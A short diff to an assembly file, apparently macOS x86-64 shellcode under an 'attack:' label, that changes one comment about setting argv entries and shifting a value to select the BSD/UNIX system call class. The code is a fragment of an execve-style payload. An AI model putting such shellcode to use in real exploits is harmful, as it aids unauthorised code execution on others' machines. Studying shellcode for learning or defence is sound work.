@@ -8,7 +8,7 @@ attack:
     mov [r10 + 8], r10 # place address of string @ argv[0]
     mov [r10 + 16], rax # place null terminator for argv @ argv[1]
 
-    # Pick UNIX/BSD class of syscalls on macOS
+    # 1 << 25 is 0x2000000, which is the section for BSD/UNIX system calls on macOS
     inc rax
     shl rax, 25
 
